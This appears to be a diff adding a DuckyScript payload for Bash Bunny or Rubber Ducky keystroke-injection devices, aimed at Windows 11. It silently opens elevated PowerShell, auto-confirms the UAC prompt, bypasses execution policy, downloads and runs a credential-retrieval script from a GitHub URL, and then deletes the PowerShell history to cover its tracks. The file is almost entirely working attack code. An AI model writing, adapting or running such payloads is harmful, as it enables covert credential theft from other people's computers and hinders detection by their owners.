@@ -1,0 +1,54 @@
+# Title: Silent Bash Bunny/Rubber Ducky Payload for Running Windows 11 Credential Retrieval Tool
+# Version: 1.0
+# Author: Spraggins Designs
+# Description: Temporarily sets PowerShell execution policy to Bypass and runs an unsigned script from GitHub silently
+
+# This script is designed to be used with a Bash Bunny or Rubber Ducky device.
+# Ensure that the device is set to the appropriate attack mode.
+
+# Payload for Bash Bunny/Rubber Ducky
+DELAY 1000
+REM Open PowerShell as Administrator silently
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"C:\Temp\run_script.ps1\"' -Verb runAs -WindowStyle Hidden"
+ENTER
+DELAY 1500
+
+REM Accept UAC prompt if it appears
+ALT y
+DELAY 1500
+
+REM Create the PowerShell script to be run
+STRING $script = @'
+ENTER
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force
+ENTER
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/spragginsdesigns/Win11-PWDump/main/Windows11-Credential-Retriever.ps1" -OutFile "$env:TEMP\Windows11-Credential-Retriever.ps1"
+ENTER
+STRING & "$env:TEMP\Windows11-Credential-Retriever.ps1"
+ENTER
+STRING '@
+ENTER
+
+REM Save the script to a temporary file
+STRING $script | Out-File -FilePath "C:\Temp\run_script.ps1"
+ENTER
+DELAY 500
+
+REM Run the saved script silently
+STRING Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "C:\Temp\run_script.ps1"' -Verb runAs -WindowStyle Hidden
+ENTER
+DELAY 1500
+
+REM Remove the REM's, for right now we don't want to get rid of this after run.
+REM Clean up the temporary script file and any downloaded files (commented out)
+REM STRING Remove-Item -Path "C:\Temp\run_script.ps1" -Force
+REM ENTER
+REM DELAY 500
+REM STRING Remove-Item -Path "$env:TEMP\Windows11-Credential-Retriever.ps1" -Force
+REM ENTER
+REM DELAY 500
+
+REM Clear PowerShell history (this is optional as well)
+STRING Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force
+ENTER
+DELAY 500
